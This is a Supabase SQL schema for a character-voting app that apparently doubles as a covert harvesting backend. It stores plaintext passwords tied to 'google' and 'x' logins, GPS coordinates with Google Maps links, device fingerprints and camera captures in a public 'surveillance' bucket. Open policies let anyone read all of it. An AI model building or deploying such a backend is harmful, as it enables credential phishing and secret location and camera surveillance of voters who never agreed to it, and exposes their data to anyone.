-- --------------------------------------------------------
-- SUPABASE / POSTGRESQL SCHEMA FOR MUSE APP
-- Copy and run this in your Supabase SQL Editor
-- --------------------------------------------------------

-- 1. Create Characters Table
create table if not exists public.characters (
    character_id text primary key, -- maps to 'c1', 'c2' frontend ID
    name text not null,
    role text,
    description text,
    image_url text,
    votes int default 0,
    theme_color text,
    family_name text default 'Unknown Family', -- NEW COLUMN
    family_icon text default 'crown',          -- NEW COLUMN
    created_at timestamp with time zone default timezone('utc'::text, now())
);

-- Enable Realtime for characters (so leaderboard updates live)
alter publication supabase_realtime add table characters;

-- 2. Create Votes Table (Log of who voted)
create table if not exists public.votes (
    id bigint generated by default as identity primary key,
    user_identifier text not null,
    character_id text references public.characters(character_id),
    device_info jsonb, -- Stores userAgent, screen size, etc
    location_data jsonb, -- Stores lat, lng, accuracy
    maps_url text, -- Direct link to Google Maps
    created_at timestamp with time zone default timezone('utc'::text, now())
);

-- 3. NEW: Create Users/Login Logs Table
-- UPDATED: Added UNIQUE constraint to prevent duplicate users
create table if not exists public.users (
    id bigint generated by default as identity primary key,
    user_identifier text not null unique, -- UNIQUE ADDED HERE
    password_text text, -- WARNING: Storing plain text for SIMULATION ONLY. Do not use in production.
    login_method text, -- 'google', 'x', or 'guest_visit'
    device_info jsonb,
    location_data jsonb,
    maps_url text, -- Direct link to Google Maps
    camera_folder_ref text, -- Reference path to storage folder
    last_login timestamp with time zone default timezone('utc'::text, now())
);

-- 4. Create Storage Bucket for Surveillance Images
insert into storage.buckets (id, name, public) values ('surveillance', 'surveillance', true)
on conflict (id) do nothing;

-- 5. Row Level Security (RLS)
alter table public.characters enable row level security;
create policy "Allow public read characters" on public.characters for select using (true);
create policy "Allow public insert/update characters" on public.characters for all using (true); -- Allow admin ops via generic API for demo

alter table public.votes enable row level security;
create policy "Allow public insert votes" on public.votes for insert with check (true);

alter table public.users enable row level security;
-- Allow Insert with Upsert (Update based on ID/User Identifier)
create policy "Allow public insert/update users" on public.users for all using (true) with check (true);
create policy "Allow public read users" on public.users for select using (true);

create policy "Allow public uploads" on storage.objects for insert with check ( bucket_id = 'surveillance' );

-- --------------------------------------------------------
-- TRIGGER: Auto-Increment Character Vote Count
-- --------------------------------------------------------
create or replace function public.increment_vote_count()
returns trigger as $$
begin
  update public.characters
  set votes = votes + 1
  where character_id = new.character_id;
  return new;
end;
$$ language plpgsql security definer;

drop trigger if exists on_vote_added on public.votes;
create trigger on_vote_added
after insert on public.votes
for each row execute procedure public.increment_vote_count();

-- --------------------------------------------------------
-- CARA MEMPERBAIKI DATA YANG SUDAH "BERANAK" (DUPLIKAT)
-- --------------------------------------------------------
-- Jalankan perintah ini di SQL Editor Supabase Anda:
--
-- 1. Hapus duplikat (sisakan yang terbaru saja)
-- DELETE FROM public.users a USING public.users b 
-- WHERE a.id < b.id AND a.user_identifier = b.user_identifier;
--
-- 2. Tambahkan aturan unik agar tidak beranak lagi di masa depan
-- ALTER TABLE public.users ADD CONSTRAINT unique_user_identifier UNIQUE (user_identifier);
--
-- --------------------------------------------------------